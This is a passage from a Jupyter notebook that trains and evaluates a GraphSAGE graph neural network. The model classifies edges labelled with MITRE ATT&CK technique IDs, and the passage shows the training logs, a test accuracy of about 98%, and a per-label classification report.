     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:27:42 | INFO | Epoch 189 | Train Loss: 0.0904 | Train Accuracy: 0.9742\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "196fb2ac719e4c63b32e0a9809f0214f",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:27:44 | INFO | Validation Loss: 0.0705 | Validation Accuracy: 0.9789\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "23e5fef0f60c43848b7d604bad083cab",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:27:56 | INFO | Epoch 190 | Train Loss: 0.0921 | Train Accuracy: 0.9735\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "0c0e2798aa9f4ef18aa9dccd878b5e50",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:27:57 | INFO | Validation Loss: 0.0829 | Validation Accuracy: 0.9744\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "127e89d3f8c34ff399fc9eb06cf8d338",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:28:09 | INFO | Epoch 191 | Train Loss: 0.0920 | Train Accuracy: 0.9733\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "68b4a848cd3f4ea791f1b5631dc58570",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:28:11 | INFO | Validation Loss: 0.0769 | Validation Accuracy: 0.9766\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "69aea0becc6e4b85aa5c211ad9d3482c",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:28:22 | INFO | Epoch 192 | Train Loss: 0.0908 | Train Accuracy: 0.9739\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "7675f9ef9e9249a599095c0579e90610",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:28:24 | INFO | Validation Loss: 0.0784 | Validation Accuracy: 0.9760\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "126745b3710842588e031e5aa937527c",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:28:35 | INFO | Epoch 193 | Train Loss: 0.0939 | Train Accuracy: 0.9731\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "a1476d5197694fb98fa09172422f1d18",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:28:37 | INFO | Validation Loss: 0.0926 | Validation Accuracy: 0.9730\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "34cb99e9ae6f4d27af6903924e668c67",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:28:49 | INFO | Epoch 194 | Train Loss: 0.0913 | Train Accuracy: 0.9739\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "44197319ca14498eb644252318a275a1",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:28:51 | INFO | Validation Loss: 0.0766 | Validation Accuracy: 0.9776\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "acef57b323f14573b0c79e0055e12537",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:29:02 | INFO | Epoch 195 | Train Loss: 0.0919 | Train Accuracy: 0.9735\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "974cb24da2514d939d813d644c308482",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:29:03 | INFO | Validation Loss: 0.0768 | Validation Accuracy: 0.9759\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "d4c2c32124d14590a2f23865d3254f05",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:29:15 | INFO | Epoch 196 | Train Loss: 0.0941 | Train Accuracy: 0.9727\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "c26e88e8e2a34894b376a993cc5f789c",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:29:17 | INFO | Validation Loss: 0.0845 | Validation Accuracy: 0.9752\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "82dd7b9f98624b83b380b5826e6af4b0",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:29:29 | INFO | Epoch 197 | Train Loss: 0.0878 | Train Accuracy: 0.9744\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "cf931f95c2e3476398d7fabb819f196a",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:29:30 | INFO | Validation Loss: 0.0657 | Validation Accuracy: 0.9804\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "c3a1c326cb994ff681657116f87a9fe7",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:29:41 | INFO | Epoch 198 | Train Loss: 0.0878 | Train Accuracy: 0.9744\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "9018126db0124e0688cae01b7ea3bbbb",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:29:43 | INFO | Validation Loss: 0.0719 | Validation Accuracy: 0.9782\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "24067fb1fe4a42c88d0a7002ebac6ac7",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:29:55 | INFO | Epoch 199 | Train Loss: 0.0889 | Train Accuracy: 0.9741\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "32aa881775a34056b0c9aafba890f9db",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:29:56 | INFO | Validation Loss: 0.0737 | Validation Accuracy: 0.9783\n",
      "\n"
     ]
    }
   ],
   "source": [
    "same_seeds(42)\n",
    "model = Model(in_features=50, hidden_features=64, out_features=128, num_classes=len(label2index), edge_embedding_dim = 50)\n",
    "model = model.to(device)\n",
    "optimizer = AdamW(model.parameters(), lr=5e-4)\n",
    "scheduler = lr_scheduler.CosineAnnealingLR(optimizer, T_max=20, eta_min=0, last_epoch=- 1, verbose=False)\n",
    "criterion = nn.CrossEntropyLoss()\n",
    "model_save_path = \"./model/GraphSAGE_secureBERT_256\"\n",
    "best_model_path = ''\n",
    "\n",
    "best_val_loss = float('inf')\n",
    "\n",
    "if not os.path.isdir(model_save_path):\n",
    "    os.makedirs(model_save_path)\n",
    "\n",
    "epochs = 200\n",
    "best_val_loss = float('inf')\n",
    "best_val_acc = float('-inf')\n",
    "best_model_path = \"\"\n",
    "for epoch in tqdm(range(epochs)):\n",
    "    model.train()\n",
    "    total_loss = 0.0\n",
    "    total_accuracy = 0.0    \n",
    "    for data in tqdm(train_dataloader):\n",
    "        loss, accuracy, _ = model_fn(data, model, criterion, device, which_type='train')        \n",
    "        optimizer.zero_grad()\n",
    "        loss.backward()\n",
    "        optimizer.step()\n",
    "\n",
    "        total_loss += loss.item()\n",
    "        total_accuracy += accuracy.item()\n",
    "\n",
    "    scheduler.step()\n",
    "    \n",
    "    avg_loss = total_loss / len(train_dataloader)\n",
    "    avg_accuracy = total_accuracy / len(train_dataloader)\n",
    "    logging.info(f'Epoch {epoch} | Train Loss: {avg_loss:.4f} | Train Accuracy: {avg_accuracy:.4f}')\n",
    "    \n",
    "    # Validation Part\n",
    "    model.eval()\n",
    "    total_accuracy = 0.0\n",
    "    total_loss = 0.0\n",
    "    with torch.no_grad():\n",
    "        for data in tqdm(valid_dataloader):\n",
    "            loss, accuracy, _ = model_fn(data, model, criterion, device, which_type='validation')\n",
    "            total_accuracy += accuracy.item()\n",
    "            total_loss += loss.item()\n",
    "\n",
    "    avg_accuracy = total_accuracy / len(valid_dataloader)\n",
    "    current_loss = total_loss / len(valid_dataloader)\n",
    "    # if current_loss < best_val_loss and avg_accuracy > best_val_acc:\n",
    "    if current_loss < best_val_loss:\n",
    "        best_val_loss = current_loss\n",
    "        best_val_acc = avg_accuracy\n",
    "        best_model_path = f'{model_save_path}/epoch_{epoch}_loss_{current_loss:.4f}_acc_{avg_accuracy:.4f}'\n",
    "        print(\"Best Model Found!! \", best_model_path)\n",
    "        \n",
    "    logging.info(f'Validation Loss: {current_loss:.4f} | Validation Accuracy: {avg_accuracy:.4f}\\n')    \n",
    "    torch.save(model.state_dict(), f'{model_save_path}/epoch_{epoch}_loss_{current_loss:.4f}_acc_{avg_accuracy:.4f}')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "id": "30c34e7d-d1bd-4cf2-9aee-1e0d480d5ee6",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'./model/GraphSAGE_secureBERT_256/epoch_186_loss_0.0624_acc_0.9814'"
      ]
     },
     "execution_count": 30,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "best_model_path"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "id": "2d315dd6",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:44:23 | INFO | Test Accuracy: 98.1042 %\n",
      "\n",
      "\n",
      "\n"
     ]
    }
   ],
   "source": [
    "# load the pretrained model\n",
    "model.load_state_dict(torch.load(best_model_path))\n",
    "\n",
    "model.to(device)\n",
    "model.eval()\n",
    "\n",
    "total = 0\n",
    "correct = 0\n",
    "true_labels = []\n",
    "predicted_labels = []\n",
    "with torch.no_grad():\n",
    "    for data in test_dataloader:\n",
    "        loss, accuracy, predicted = model_fn(data, model, criterion, device, which_type='test')\n",
    "        labels = data.edata['label'].to(device)\n",
    "        \n",
    "        true_labels.extend(labels.cpu().numpy())\n",
    "        predicted_labels.extend(predicted.cpu().numpy())\n",
    "                \n",
    "        total += labels.size(0)\n",
    "        correct += (predicted == labels).sum().item()\n",
    "\n",
    "logging.info(f'Test Accuracy: {100 * correct / total:.4f} %\\n\\n\\n')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "id": "77a3a939",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "/media/Raid6_disk/bai/anaconda3/envs/DGL/lib/python3.10/site-packages/sklearn/metrics/_classification.py:1497: UndefinedMetricWarning: Precision is ill-defined and being set to 0.0 in labels with no predicted samples. Use `zero_division` parameter to control this behavior.\n",
      "  _warn_prf(average, modifier, f\"{metric.capitalize()} is\", len(result))\n",
      "/media/Raid6_disk/bai/anaconda3/envs/DGL/lib/python3.10/site-packages/sklearn/metrics/_classification.py:1497: UndefinedMetricWarning: Precision is ill-defined and being set to 0.0 in labels with no predicted samples. Use `zero_division` parameter to control this behavior.\n",
      "  _warn_prf(average, modifier, f\"{metric.capitalize()} is\", len(result))\n",
      "/media/Raid6_disk/bai/anaconda3/envs/DGL/lib/python3.10/site-packages/sklearn/metrics/_classification.py:1497: UndefinedMetricWarning: Precision is ill-defined and being set to 0.0 in labels with no predicted samples. Use `zero_division` parameter to control this behavior.\n",
      "  _warn_prf(average, modifier, f\"{metric.capitalize()} is\", len(result))\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "report output at:  ./result/GraphSAGE_emb256/result.csv\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>label</th>\n",
       "      <th>precision</th>\n",
       "      <th>recall</th>\n",
       "      <th>f1-score</th>\n",
       "      <th>support</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>T1112_34041639e6e501856ecaf5969ee29c76_I</td>\n",
       "      <td>1.000000</td>\n",
       "      <td>0.710526</td>\n",
       "      <td>0.830769</td>\n",
       "      <td>38.000000</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>T1547.001_1f15ab22c39a9b6bb2bb0d77276dfcb3_I</td>\n",
       "      <td>0.500000</td>\n",
       "      <td>0.228070</td>\n",
       "      <td>0.313253</td>\n",
       "      <td>57.000000</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>T1499_2fe2d5e6-7b06-4fc0-bf71-6966a1226731_B</td>\n",
       "      <td>0.954545</td>\n",
       "      <td>1.000000</td>\n",
       "      <td>0.976744</td>\n",
       "      <td>21.000000</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>T1036.003_04e8d83e7badf098d50800d6aa1dd487_B</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>21.000000</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>T1562.002_6a8d25d65a7d481dc479f89c62af1e6a_I</td>\n",
       "      <td>1.000000</td>\n",
       "      <td>0.227273</td>\n",
       "      <td>0.370370</td>\n",
       "      <td>44.000000</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>272</th>\n",
       "      <td>T1119_7121cdf93b951311be9d7078c602efdc_B</td>\n",
       "      <td>0.333333</td>\n",
       "      <td>0.090909</td>\n",
       "      <td>0.142857</td>\n",
       "      <td>22.000000</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>273</th>\n",
       "      <td>T1115_70795de7cbb842edb029b3378c27c008_B</td>\n",
       "      <td>0.950000</td>\n",
       "      <td>0.950000</td>\n",
       "      <td>0.950000</td>\n",
       "      <td>20.000000</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>274</th>\n",
       "      <td>accuracy</td>\n",
       "      <td>0.981042</td>\n",
       "      <td>0.981042</td>\n",
       "      <td>0.981042</td>\n",
       "      <td>0.981042</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>275</th>\n",
       "      <td>macro avg</td>\n",
       "      <td>0.813239</td>\n",
       "      <td>0.758342</td>\n",
       "      <td>0.770942</td>\n",
       "      <td>778618.000000</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>276</th>\n",
       "      <td>weighted avg</td>\n",
       "      <td>0.982202</td>\n",
       "      <td>0.981042</td>\n",
       "      <td>0.980742</td>\n",
       "      <td>778618.000000</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>277 rows × 5 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "                                            label  precision    recall  \\\n",
       "0        T1112_34041639e6e501856ecaf5969ee29c76_I   1.000000  0.710526   \n",
       "1    T1547.001_1f15ab22c39a9b6bb2bb0d77276dfcb3_I   0.500000  0.228070   \n",
       "2    T1499_2fe2d5e6-7b06-4fc0-bf71-6966a1226731_B   0.954545  1.000000   \n",
       "3    T1036.003_04e8d83e7badf098d50800d6aa1dd487_B   0.000000  0.000000   \n",
       "4    T1562.002_6a8d25d65a7d481dc479f89c62af1e6a_I   1.000000  0.227273   \n",
       "..                                            ...        ...       ...   \n",
       "272      T1119_7121cdf93b951311be9d7078c602efdc_B   0.333333  0.090909   \n",
       "273      T1115_70795de7cbb842edb029b3378c27c008_B   0.950000  0.950000   \n",
       "274                                      accuracy   0.981042  0.981042   \n",
       "275                                     macro avg   0.813239  0.758342   \n",
       "276                                  weighted avg   0.982202  0.981042   \n",
       "\n",
       "     f1-score        support  \n",
       "0    0.830769      38.000000  \n",
       "1    0.313253      57.000000  \n",
       "2    0.976744      21.000000  \n",
       "3    0.000000      21.000000  \n",
       "4    0.370370      44.000000  \n",
       "..        ...            ...  \n",
       "272  0.142857      22.000000  \n",
       "273  0.950000      20.000000  \n",
       "274  0.981042       0.981042  \n",
       "275  0.770942  778618.000000  \n",
       "276  0.980742  778618.000000  \n",
       "\n",
       "[277 rows x 5 columns]"
      ]
     },
     "execution_count": 32,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "report_data = classification_report(true_labels, predicted_labels, output_dict=True)\n",
    "report_df = pd.DataFrame(report_data).transpose()\n",
    "\n",
    "output_path = \"./result/GraphSAGE_emb256\"\n",
    "if not os.path.isdir(output_path):\n",
    "    os.makedirs(output_path)\n",
    "    \n",
    "report_df.reset_index(inplace=True, names='label')\n",
    "\n",
    "label_list = []\n",
    "for idx, row in report_df.iterrows():\n",
    "    if row[\"label\"].isdigit():\n",
    "        row[\"label\"] = index2label[int(row[\"label\"])]\n",
    "    label_list.append(row[\"label\"])\n",
    "report_df[\"label\"] = label_list\n",
    "\n",
    "report_df.to_csv(f'{output_path}/result.csv', index=False)\n",
    "print(\"report output at: \", f'{output_path}/result.csv')\n",
    "\n",
    "report_df"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b5eeca21-1da7-42d2-8306-950bb6490fd3",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.13"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
